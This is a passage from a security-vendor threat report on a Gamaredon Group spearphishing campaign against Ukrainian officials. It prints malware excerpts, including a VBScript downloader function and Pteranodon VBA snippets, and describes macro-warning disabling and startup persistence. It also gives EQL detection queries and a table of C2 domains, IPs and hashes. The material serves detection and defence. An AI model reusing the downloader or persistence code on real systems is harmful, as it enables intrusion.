<pre><code>Function TOGeMFBD(iWotBBKf)
On Error Resume Next
Set EXJJrRlN = CreateObject(&quot;MSXML2.XMLHTTP&quot;)
With EXJJrRlN
.Open &quot;GET&quot;, iWotBBKf, False
.send
End With
If EXJJrRlN.Status = 200 Then
TOGeMFBD = EXJJrRlN.ResponseBody
End If
End Function</code></pre>
<p><em>Figure 14 - GET request (security.vbs)</em></p>
<p>During dynamic analysis, analysts identified that the script enters a loop while sending the request. A 0-byte file is created under the infected user’s roaming profile with a procedurally generated file name and text file extension. The file is iteratively written and deleted without the contents changing.</p>
<p>Analysts have not confirmed the purpose of this file, and suspect it is used to reassemble a segmented later-stage implant. Potential reasons to obfuscate this process include evading detection and response solutions.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="pteranodon-update" class="absolute -top-32"></span>Pteranodon update</h2>
<p>While doing this research, we observed samples and artifacts that appear to be related to an updated version of the Gamaredon Group’s custom backdoor, known as <a href="https://attack.mitre.org/software/S0147/">Pteranodon</a>. Although we don’t have substantial evidence that Pteranodon is the final payload victims are infected with during this campaign, we assess with moderate confidence that this activity is linked to Gamaredon Group.</p>
<p>Three PE samples were uploaded to VirusTotal last month with each dropping two text files (<a href="https://www.virustotal.com/gui/file/c4089686965df5e52105b6eac06703aa11c4891695278446370f623d531b505e/details">ExcelMyMacros.vba</a>, <a href="https://www.virustotal.com/gui/file/02e6e2bfaaf6e77cfaccadaf26167135c53cf2c934d17c5a83e5bbcadd85b47d/details">wordMacros.vba</a>). The two text files share several similarities to the VBA macro code found in the remote templates used in this campaign — specifically, the methods of retrieving and hex-encoding the serial number and similar subroutine logic. Figure 15 depicts the VBA macro code from the remote template on the left and the dropped VBA macro code from a known Pteranodon implant on the right.</p>
<p><strong>VBA from Campaign</strong></p>
<pre><code>For LfJesrvH = 0 To UBound( IvAPFGDD )&quot; + vbCrLf
LISPVdZd.Write &quot;IvAPFGDD(LfJesrvH) = Asc( Mid( EaCJFwPc, LfJesrvH + 1, 1 ) )&quot; + vbCrLf
LISPVdZd.Write &quot;Next&quot; + vbCrLf
LISPVdZd.Write &quot;GetFEDzCjgi = IvAPFGDD&quot; + vbCrLf</code></pre>
<p><strong>VBA from Pteranodon</strong></p>
<pre><code>For i = 0 To UBound( asrrCodes )&quot; + vbCrLf
NewVDJKpCBSFile.Write &quot; asrrCodes(i) = Asc( Mid( myPassPhrase, i + 1, 1 ) )&quot; + vbCrLf
NewVDJKpCBSFile.Write &quot; Next&quot; + vbCrLf
NewVDJKpCBSFile.Write &quot; GetKey = asrrCodes&quot; + vbCrLf</code></pre>
<p><em>Figure 15 - Macro comparison - VBA from Campaign (top) vs VBA from Pteranodon (bottom)</em></p>
<p>Both text files contained VBA, and had the same functionality for disabling macro warnings, creating a persistent VBScript in the startup folder and establishing connections to C2. What’s interesting with the dropped text files (VBA), is that they show the true variable names used by the developers before their tooling obfuscates the variables. At the time of this writing, each of the four C2 servers (see attached indicators) affiliated with Pteranodon samples were currently active and hosted a network allocated to ASN9123 (TIMEWEB LTD). Macro code associated with the Gamaredon Group campaign targeting Ukraninan officials called back to C2 hosted in the same network.</p>
<p>An interesting change in some of these artifacts appears to be the adoption of .NET. Along with the two text files containing VBA code, there are three dropped DLL’s (Microsoft.Office.Interop.Excel.dll, Microsoft.Office.Interop.Word.dll, Microsoft.Vbe.Interop.dll) and a .NET <a href="https://www.virustotal.com/gui/file/145a61a14ec6d32b105a6279cd943317b41f1d27f21ac64df61bcdd464868edd/details">sample</a> showing dependencies with these files. Figure 16 shows a hex-encoded reference to one of the VBA files (wordMacros.txt). Based on these observations, it’s intriguing to see Gamaredon Group continue to leverage core functionality of their VBA stager code, but in a new method of execution by using .NET</p>
<p></p>
<p><em>Figure 16 - .NET reference to “wordMacros.txt”</em></p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="detection-crafting" class="absolute -top-32"></span>Detection crafting</h2>
<p>For organizations interested in detecting TTPs discussed in this blog post, detection logic has been provided for the following categories:</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="dynamic-dns" class="absolute -top-32"></span>Dynamic DNS</h3>
<p><a href="https://attack.mitre.org/techniques/T1311/">Dynamic DNS</a> enables adversaries to rapidly provision very large numbers of records that map back to their infrastructure, creating a confusion layer between victims and adversaries. Gamaredon Group exclusively used Dynamic DNS locations for remotely hosted templates, rotating domains consistently, and leveraging separate infrastructure for hosting stagers and templates.</p>
<p>Profiling Dynamic DNS for your enterprise is an amazing way to get started hunting — not just to baseline and build environmental awareness, but also to outright find evil. We will primarily focus on the two Dynamic DNS providers observed in relation to this campaign. If you need inspiration, consider counting up all non-browser processes that made a DNS request to one of these Dynamic DNS providers as shown in Figure 17.</p>
<pre><code>dns where wildcard(query_name, &quot;*.ddns.net&quot;, &quot;*.hopto.org&quot;, &quot;*.bounceme.net&quot;) and
process_name not in (&quot;chrome.exe&quot;,&quot;iexplore.exe&quot;, &quot;firefox.exe&quot;)
| count process_name, query_name</code></pre>
<p><em>Figure 17 - EQL Query - Count of non-browser process to dynamic DNS providers</em></p>
<p>Another option examines the processes that most frequently communicate with these providers, and may provide more context regarding how dynamic DNS is used in your environment, or enable an analyst to find signs of other malicious activity.</p>
<pre><code>network where event of
[dns where wildcard(query_name, &quot;*.ddns.net&quot;, &quot;*.hopto.org&quot;, &quot;*.bounceme.net&quot;)
| count process_name, total_in_bytes, total_out_bytes</code></pre>
<p><em>Figure 18 - EQL query - Network traffic of processes to dynamic DNS providers</em></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="template-injection" class="absolute -top-32"></span>Template Injection</h3>
<p>Spearphishing attachments that utilize <a href="https://attack.mitre.org/techniques/T1221/">template injection</a> may bypass security controls because they contain no embedded VBA code. The attached document retrieves a remotely hosted template where the malicious VBA code resides. In order to detect this activity dynamically, analyze DNS and network traffic over common protocols (HTTP/HTTPS/SMB) and processes generated by Microsoft Office applications. Enterprise defenders may need to whitelist any legitimate use of remotely hosted templates, or any benign network activity to Microsoft infrastructure. Below is an example EQL query focused on new process creation events from Office products that also made DNS requests outside our whitelist.</p>
<pre><code>sequence by unique_pid
[process where process_name in (&quot;winword.exe&quot;, &quot;excel.exe&quot;, &quot;powerpnt.exe&quot;)]
[dns where not wildcard(query_name , &quot;*.microsoft.com&quot;, &quot;*.skype.com&quot;)]</code></pre>
<p><em>Figure 19 - EQL query - DNS traffic from Office applications</em></p>
<p>Some enhancements we can use with the previous query is to add a network event to the sequence as well as look for a spawned child process bringing in more context to the detection.</p>
<pre><code>sequence
[process where process_name in (&quot;winword.exe&quot;, &quot;excel.exe&quot;, &quot;powerpnt.exe&quot;)] by unique_pid
[dns where not wildcard(query_name, &quot;*.microsoft.com&quot;, &quot;*.skype.com&quot;)] by unique_pid
[network where true] by unique_pid
[process where subtype.create] by unique_ppid</code></pre>
<p><em>Figure 20 - EQL query - Network traffic making dynamic DNS requests from Office applications</em></p>
<p>If we wanted to tailor a sequence-based detection to the Gamaredon Group activity specifically, we can bring in the previous Dynamic DNS providers, which creates a more restrictive filter.</p>
<pre><code>sequence by unique_pid
[process where process_name in (&quot;winword.exe&quot;, &quot;excel.exe&quot;, &quot;powerpnt.exe&quot;)]
[network where event of
[dns where wildcard(query_name, &quot;*.ddns.net&quot;, &quot;*.hopto.org&quot;, &quot;*.bounceme.net&quot;)]]</code></pre>
<p><em>Figure 21 - EQL query - Network traffic making dynamic DNS requests from Office applications</em></p>
<p>Across a range of features provided by the Elastic Endpoint, this attack is prevented through different machine-learning technologies to stop advanced threats such as macro-enabled documents and malicious binaries. Along with these protections, we can take nearly any EQL logic and deploy it in prevention mode to completely stop an attack such as in this example with the download and execution of the remote template. Here’s a short clip in action:</p>
<div></div>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="malicious-registry-configuration" class="absolute -top-32"></span>Malicious registry configuration</h3>
<p>In order for adversaries to be effective in their mission, they often create their own opportunities. In this case, the adversary reconfigured the target endpoint in order to disable macro security warnings and trust future macros automatically. These small changes can end up having larger implications, and defenders can look for them as symptoms of more serious security issues. For example, these same techniques have also been associated with threat groups like APT32 and are leveraged by malware families such as <a href="https://www.fortinet.com/blog/threat-research/in-depth-analysis-of-net-malware-javaupdtr.html">AgentTesla</a> and <a href="https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/">BabyShark</a>.</p>
<p>This query looks for evidence of the registry modifications that disable warnings for macros and automatically enabling future macros:</p>
<pre><code>registry where registry_data == 1 and wildcard(registry_path,
&quot;*\\Software\\Microsoft\\Office\\*\\Word\\Security\\AccessVBOM&quot;,
&quot;*\\Software\\Microsoft\\Office\\*\\Word\\Security\\VBAWarnings&quot;)</code></pre>
<p><em>Figure 22 - EQL query - Registry modifications around disabling macro security features</em></p>
<p>That would function perfectly well as a standalone detection, but EQL allows us to look for both the registry modification and template injection techniques in this example query:</p>
<pre><code>sequence by unique_pid
[process where process_name in (&quot;winword.exe&quot;, &quot;excel.exe&quot;, &quot;powerpnt.exe&quot;)]
[registry where registry_data == 1 and wildcard(registry_path,
&quot;*\\Software\\Microsoft\\Office\\*\\Word\\Security\\AccessVBOM&quot;,
&quot;*\\Software\\Microsoft\\Office\\*\\Word\\Security\\VBAWarnings&quot;)]
[registry where registry_data == 1 and wildcard(registry_path,
&quot;*\\Software\\Microsoft\\Office\\*\\Word\\Security\\AccessVBOM&quot;,
&quot;*\\Software\\Microsoft\\Office\\*\\Word\\Security\\VBAWarnings&quot;)]</code></pre>
<p><em>Figure 23 - EQL query - Registry modifications around disabling macro security features</em></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence-startup" class="absolute -top-32"></span>Persistence startup</h3>
<p>Gamaredon Group leveraged both malicious Windows shortcut files and script objects written to the <a href="https://attack.mitre.org/techniques/T1060/">Startup folder</a> for persistence. This technique is very effective in spite of its simplicity and continues to be popular among adversaries. One of the first places to start building detection logic would be to inquire about processes that write files to the startup folder.</p>
<pre><code>file where subtype.create
and (
file_path == &quot;*\\Programs\\Startup\\*.lnk&quot; or
file_path == &quot;*\\Programs\\Startup\\*.vbs&quot;
)
| count process_name, file_path, user_name</code></pre>
<p><em>Figure 24 - EQL query - Monitoring file writes to startup folder</em></p>
<p>To take it a bit further, we can also customize detection logic to include the VBScript execution at logon. This is a great example for building a sequenced-based signal, as we will track the adversary’s activity over an extended period of time — such as 90 days. Once the machine is rebooted or the user logs back in, an alert can be generated when WScript executes the VBScript file at startup.</p>
<pre><code>sequence with maxspan=90d
[file where subtype.create and file_path == &quot;*\\Programs\\Startup\\*.vbs&quot;]
[process where subtype.create and parent_process_name==&quot;explorer.exe&quot; and
process_name == “wscript.exe” and command_line == &quot;*\\Programs\\Startup\\*&quot;]</code></pre>
<p><em>Figure 25 - EQL query - Monitoring execution of startup processes</em></p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="conclusion" class="absolute -top-32"></span>Conclusion</h2>
<p>In this post, we reviewed recent campaign TTPs tied to an adversary known publicly as Gamaredon Group. This group is likely to have been active since at least 2013 and has engaged in an ongoing campaign against Ukraine at the time of this writing. We highlighted some of their current techniques such as template injection and the use of Dynamic DNS providers, the macro code found in a recent sample, and updates to their custom backdoor known as Pteranodon. By using <a href="https://www.elastic.co/blog/introducing-event-query-language">EQL</a>, we also shared hunting and detection strategies around four specific techniques used by Gamaredon Group.</p>
<p>We hope that by sharing some of these insights and queries, we can help raise awareness and continue to focus on protecting the world&#x27;s data from attacks. To enable organizations further, we’ve added all the Indicators of Compromise (IOCs) below and added the queries in this post into the <a href="https://eqllib.readthedocs.io/en/latest/analytics.html">EQLLib repository</a>.</p>
<p>Interested in using Elastic Security? Try <a href="https://www.elastic.co/siem">Elastic SIEM</a> for free.</p>
<p>Plus, <a href="https://github.com/elastic/elasticsearch/issues/49581">EQL support is being added to Elasticsearch</a>!</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="indicators-of-compromise-iocs" class="absolute -top-32"></span>Indicators of Compromise (IOCs)</h2>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>Lure Document SHA-256</td><td>86e0701349903105b0c346df9485dd59d85dd9463c2bee46d974ea1b1d7059d4</td></tr><tr><td>Remote Template (pos.dot) SHA-256</td><td>feb0596e9735e03ae929d9b5ee862da19e16e5cdf57dd2a795205e591a55940f</td></tr><tr><td>Remote Template from Lure Document Domain</td><td>document-out[.]hopto[.]org/pos[.]dot</td></tr><tr><td>Remote Template Hosting IP</td><td>141[.]8[.]195[.]60</td></tr><tr><td>Remote Template Hosting IP</td><td>141[.]8[.]192[.]153</td></tr><tr><td>System Information Upload IP</td><td>188[.]225[.]25[.]50</td></tr><tr><td>System Information Upload URI</td><td>libcrash.ddns[.]net/{Computername_SerialNumber}//posolreboot.php</td></tr><tr><td>ExcelMyMacros.vba SHA-256</td><td>c4089686965df5e52105b6eac06703aa11c4891695278446370f623d531b505e</td></tr><tr><td>wordMacros.vba SHA-256</td><td>02e6e2bfaaf6e77cfaccadaf26167135c53cf2c934d17c5a83e5bbcadd85b47d</td></tr><tr><td>ExcelMyMacros.txt SHA-256</td><td>2f310c5b16620d9f6e5d93db52607f21040b4829aa6110e22ac55fab659e9fa1</td></tr><tr><td>Pteranodon SHA-256</td><td>c1524a4573bc6acbe59e559c2596975c657ae6bbc0b64f943fffca663b98a95f</td></tr><tr><td>Pteranodon SHA-256</td><td>145a61a14ec6d32b105a6279cd943317b41f1d27f21ac64df61bcdd464868edd</td></tr><tr><td>Pteranodon Domain</td><td>beercraft[.]space</td></tr><tr><td>Pteranodon Domain</td><td>skymage[.]fun</td></tr><tr><td>Pteranodon Domain</td><td>masseffect[.]space</td></tr><tr><td>Pteranodon Domain</td><td>masseffect[.]website</td></tr><tr><td>Pteranodon IP</td><td>185[.]200[.]241[.]88</td></tr><tr><td>Pteranodon IP</td><td>188[.]225[.]46[.]94</td></tr></tbody></table></div>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="references" class="absolute -top-32"></span>References</h2>
<ol>
<li><a href="https://www.anomali.com/resources/whitepapers/malicious-activity-aligning-with-gamaredon-ttps-targets-ukraine">https://www.anomali.com/resources/whitepapers/malicious-activity-aligning-with-gamaredon-ttps-targets-ukraine</a></li>
</ol></div></div></div><div class="hidden lg:flex lg:col-span-1 text-sm lg:flex-col lg:space-y-6"><div class="toc"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Jump to section</h4><ul class="flex flex-col space-y-2"><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/playing-defense-against-gamaredon-group#campaign-details"><span>Campaign&nbsp;Details</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/playing-defense-against-gamaredon-group#document-metadata-analysis"><span>Document metadata&nbsp;analysis</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/playing-defense-against-gamaredon-group#macro-code-analysis"><span>Macro code&nbsp;analysis</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/playing-defense-against-gamaredon-group#pteranodon-update"><span>Pteranodon&nbsp;update</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/playing-defense-against-gamaredon-group#detection-crafting"><span>Detection&nbsp;crafting</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/playing-defense-against-gamaredon-group#dynamic-dns"><span>Dynamic&nbsp;DNS</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/playing-defense-against-gamaredon-group#template-injection"><span>Template&nbsp;Injection</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/playing-defense-against-gamaredon-group#malicious-registry-configuration"><span>Malicious registry&nbsp;configuration</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/playing-defense-against-gamaredon-group#persistence-startup"><span>Persistence&nbsp;startup</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/playing-defense-against-gamaredon-group#conclusion"><span>Conclusion</span></a></li></ul><button class="border-t border-white/20 w-full mt-3 py-2 flex items-center space-x-1 text-xs font-medium uppercase tracking-wide hover:text-white"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="w-3 h-3"><path d="M10.75 4.75a.75.75 0 00-1.5 0v4.5h-4.5a.75.75 0 000 1.5h4.5v4.5a.75.75 0 001.5 0v-4.5h4.5a.75.75 0 000-1.5h-4.5v-4.5z"></path></svg><span>Show more</span></button></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Elastic Security Labs Newsletter</h4><div><a target="_blank" class="button inline-flex" href="https://www.elastic.co/elastic-security-labs/newsletter?utm_source=security-labs">Sign Up</a></div></div></div></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl my-5 md:my-10 max-w-3xl mx-auto flex flex-col items-center shadow-2xl"><h4 class="font-bold leading-tight text-lg md:text-2xl">Share this article</h4><div class="flex flex-wrap items-center justify-center mt-4 space-x-4"><a class="flex items-center space-x-2 button" href="https://twitter.com/intent/tweet?text=Playing defense against Gamaredon Group&amp;url=https://www.elastic.co/security-labs/playing-defense-against-gamaredon-group" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Twitter" title="Share this article on Twitter"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>Twitter</span></a><a class="flex items-center space-x-2 button" href="https://www.facebook.com/sharer/sharer.php?u=https://www.elastic.co/security-labs/playing-defense-against-gamaredon-group" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Facebook" title="Share this article on Facebook"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M22.5 12c0-5.799-4.701-10.5-10.5-10.5S1.5 6.201 1.5 12c0 5.301 3.901 9.699 9 10.401V14.4h-2.7v-2.7h2.7v-2.1c0-2.7 1.8-4.2 4.2-4.2 1.2 0 2.1.1 2.4.2v2.4h-1.5c-1.2 0-1.5.6-1.5 1.5v1.8h3l-.3 2.7h-2.7V22C18.599 21.3 22.5 17.301 22.5 12z"></path></svg><span>Facebook</span></a><a class="flex items-center space-x-2 button" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.elastic.co/security-labs/playing-defense-against-gamaredon-group&amp;title=Playing defense against Gamaredon Group" target="_blank" rel="noopener noreferrer" aria-label="Share this article on LinkedIn" title="Share this article on LinkedIn"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path></svg><span>LinkedIn</span></a><a class="flex items-center space-x-2 button" href="https://reddit.com/submit?url=https://www.elastic.co/security-labs/playing-defense-against-gamaredon-group&amp;title=Playing defense against Gamaredon Group" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Reddit" title="Share this article on Reddit"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 12C24 18.6274 18.6274 24 12 24C5.37258 24 0 18.6274 0 12C0 5.37258 5.37258 0 12 0C18.6274 0 24 5.37258 24 12ZM19.6879 11.0584C19.8819 11.3352 19.9916 11.6622 20.004 12C20.0091 12.3306 19.9205 12.656 19.7485 12.9384C19.5765 13.2208 19.3281 13.4488 19.032 13.596C19.0455 13.7717 19.0455 13.9483 19.032 14.124C19.032 16.812 15.9 18.996 12.036 18.996C8.172 18.996 5.04 16.812 5.04 14.124C5.02649 13.9483 5.02649 13.7717 5.04 13.596C4.80919 13.49 4.6042 13.335 4.43923 13.1419C4.27427 12.9487 4.15327 12.722 4.08462 12.4775C4.01598 12.2329 4.00133 11.9764 4.04169 11.7256C4.08205 11.4748 4.17646 11.2358 4.31837 11.0251C4.46028 10.8145 4.6463 10.6372 4.86354 10.5056C5.08078 10.3739 5.32404 10.2911 5.57646 10.2629C5.82889 10.2346 6.08444 10.2616 6.32541 10.3419C6.56638 10.4222 6.78701 10.5539 6.972 10.728C8.35473 9.79023 9.98146 9.27718 11.652 9.252L12.54 5.088C12.55 5.03979 12.5694 4.99405 12.5972 4.95341C12.625 4.91277 12.6605 4.87805 12.7018 4.85127C12.7431 4.82448 12.7894 4.80615 12.8378 4.79735C12.8862 4.78855 12.9359 4.78945 12.984 4.8L15.924 5.388C16.0676 5.14132 16.2944 4.9539 16.5637 4.85937C16.833 4.76484 17.1272 4.7694 17.3934 4.87222C17.6597 4.97505 17.8806 5.1694 18.0164 5.42041C18.1523 5.67141 18.1942 5.96262 18.1348 6.24177C18.0753 6.52092 17.9182 6.76972 17.6918 6.94352C17.4654 7.11732 17.1845 7.20473 16.8995 7.19006C16.6144 7.1754 16.3439 7.05962 16.1366 6.8635C15.9292 6.66738 15.7985 6.40378 15.768 6.12L13.2 5.58L12.42 9.324C14.0702 9.3594 15.6749 9.87206 17.04 10.8C17.2839 10.566 17.5902 10.4074 17.9221 10.3436C18.254 10.2797 18.5973 10.3132 18.9106 10.4401C19.2239 10.5669 19.4939 10.7817 19.6879 11.0584ZM8.20624 12.5333C8.07438 12.7307 8.004 12.9627 8.004 13.2C8.004 13.5183 8.13043 13.8235 8.35547 14.0485C8.58051 14.2736 8.88574 14.4 9.204 14.4C9.44134 14.4 9.67335 14.3296 9.87068 14.1978C10.068 14.0659 10.2218 13.8785 10.3127 13.6592C10.4035 13.4399 10.4272 13.1987 10.3809 12.9659C10.3346 12.7331 10.2204 12.5193 10.0525 12.3515C9.8847 12.1836 9.67089 12.0694 9.43811 12.0231C9.20533 11.9768 8.96405 12.0005 8.74478 12.0913C8.52551 12.1822 8.33809 12.336 8.20624 12.5333ZM12.012 17.424C13.0771 17.4681 14.1246 17.1416 14.976 16.5V16.548C15.0075 16.5173 15.0327 16.4806 15.05 16.4402C15.0674 16.3997 15.0766 16.3563 15.0772 16.3122C15.0777 16.2682 15.0696 16.2245 15.0533 16.1837C15.0369 16.1428 15.0127 16.1055 14.982 16.074C14.9513 16.0425 14.9146 16.0173 14.8742 16C14.8337 15.9826 14.7903 15.9734 14.7462 15.9728C14.7022 15.9723 14.6585 15.9804 14.6177 15.9967C14.5768 16.0131 14.5395 16.0373 14.508 16.068C13.7797 16.5904 12.895 16.8487 12 16.8C11.1061 16.8399 10.2255 16.5732 9.504 16.044C9.44182 15.993 9.36289 15.9669 9.28256 15.9708C9.20222 15.9748 9.12622 16.0085 9.06935 16.0653C9.01247 16.1222 8.97879 16.1982 8.97484 16.2786C8.97089 16.3589 8.99697 16.4378 9.048 16.5C9.89937 17.1416 10.9469 17.4681 12.012 17.424ZM14.0933 14.2458C14.2907 14.3776 14.5227 14.448 14.76 14.448L14.748 14.496C14.9107 14.4978 15.0721 14.4664 15.2223 14.4038C15.3725 14.3413 15.5084 14.2488 15.6218 14.1321C15.7352 14.0154 15.8236 13.8768 15.8818 13.7248C15.9399 13.5728 15.9665 13.4106 15.96 13.248C15.96 13.0107 15.8896 12.7787 15.7578 12.5813C15.6259 12.384 15.4385 12.2302 15.2192 12.1393C14.9999 12.0485 14.7587 12.0248 14.5259 12.0711C14.2931 12.1174 14.0793 12.2316 13.9115 12.3995C13.7436 12.5673 13.6294 12.7811 13.5831 13.0139C13.5368 13.2467 13.5605 13.4879 13.6513 13.7072C13.7422 13.9265 13.896 14.1139 14.0933 14.2458Z" fill="currentColor"></path></svg><span>Reddit</span></a></div></div></article></main><footer class="mt-auto text-xs md:text-sm"><div class="container py-6 flex flex-col md:flex-row gap-2 md:gap-0 justify-between items-center"><div class="text-zinc-300"><nav><ul class="flex space-x-4"><li><a class="hover:text-white font-medium" href="/security-labs/sitemap.xml">Sitemap</a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://elastic.co?utm_source=elastic-search-labs&amp;utm_medium=referral&amp;utm_campaign=search-labs&amp;utm_content=footer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="inline-block w-3 h-3"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"></path></svg><span>Elastic.co</span></a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://twitter.com/elasticseclabs"><svg class="w-4 h-4 inline-block w-3 h-3" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>@elasticseclabs</span></a></li></ul></nav></div><div class="flex flex-col space-y-1 text-zinc-300"><p>© <!-- -->2025<!-- -->. Elasticsearch B.V. All Rights Reserved.</p></div></div></footer></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"article":{"title":"Playing defense against Gamaredon Group","slug":"playing-defense-against-gamaredon-group","date":"2022-06-21","description":"Learn about the recent campaign of a Russia-based threat group known as Gamaredon Group.  This post will review these details and provide detection strategies.","image":"blog-thumb-digital-shield.jpg","body":{"raw":"\nFor several months, the Intelligence \u0026 Analytics team at Elastic Security has tracked an ongoing adversary campaign appearing to target Ukranian government officials. Based on our monitoring, we believe [Gamaredon Group](https://attack.mitre.org/groups/G0047/), a suspected Russia-based threat group, is behind this campaign. Our observations suggest a significant overlap between tactics, techniques, and procedures (TTPs) included within this campaign and [public reporting](https://www.anomali.com/resources/whitepapers/malicious-activity-aligning-with-gamaredon-ttps-targets-ukraine)\u003csup\u003e1\u003c/sup\u003e.\n\nThis campaign has produced and deployed updated lures on a near-daily basis that appear to target multiple Ukrainian government departments. With this high operational tempo and aggressive targeting, they consistently employ a cluster of initial access techniques and procedures. Over the past four months, these techniques have consisted of spearphishing, remote document template injection, startup folder persistence, VBA/VBScript languages, and Dynamic DNS command \u0026 control infrastructure.\n\nIn this post, we’ll walk through the campaign details, reviewing the implementation while also providing solutions such as detection strategies through the use of Elastic’s [Event Query Language (EQL)](https://www.elastic.co/blog/introducing-event-query-language).\n\n## Campaign Details\n\nThe earliest identified [infrastructure](https://www.virustotal.com/gui/domain/libre-templates.ddns.net/details) indicates this campaign has been active since August 2019. The first [sample](https://www.virustotal.com/gui/file/481eee236eadf6c947857820d3af5a397caeb8c45791f0bbdd8a21f080786e75/details) leveraging this domain was submitted to VirusTotal in early September 2019. Spearphishing emails like the example in Figure 1 (below) were used to deliver a malicious attachment and demonstrate Gamaredon Group’s attempt to impersonate an anti-corruption activist. This example targeted the National Security and Defense Council of Ukraine and dates to January 17, 2020.\n\n![](/assets/images/playing-defense-against-gamaredon-group/email_redact1.png)\n\n_Figure 1 - Spearphishing email sent to National Security and Defense Council of Ukraine_\n\nA typical lure document might masquerade as an information request to the Ministry of Foreign Affairs of Ukraine. These manufactured lures included official logos stolen from governmental offices of Ukraine and impersonated diplomats known to their targets.\n\n![](/assets/images/playing-defense-against-gamaredon-group/lure1.png)\n\n_Figure 2 - Lure document - Ministry of Foreign Affairs in Ukraine request_\n\nTo improve their chances of success, they customize the request around the same date of the campaign and include urgent requests for action. These efforts are indicative of necessity.\n\n![](/assets/images/playing-defense-against-gamaredon-group/lure2.jpg)\n\n_Figure 3 - Lure document - Information request related to NSDC Head of Ukraine_\n\nOften, the call to action first required the victim to open an attached lure document. A user who attempted to open one of these malicious attachments would see a perfectly convincing decoy document, while a sequence of invisible actions occurred behind the screen. These documents end up leveraging a technique known as [template injection](https://attack.mitre.org/techniques/T1221/), a method of loading remotely hosted Microsoft Word document templates.\n\nMicrosoft Word objects function similarly to compressed archives and have properties defined using Microsoft’s Open Office XML (OOXML) format. Within the decompressed word/\\_rels/ subdirectory, the file settings.xml.rels contained a network location where a remotely hosted template was retrieved as depicted in Figure 4.\n\n![](/assets/images/playing-defense-against-gamaredon-group/template1.jpg)\n\n_Figure 4 - Excerpt from Settings.xml.rels_\n\nEach external URL within these lures were configured to point to Dynamic DNS providers (ddns.net, hopto.org). Dynamic DNS provides 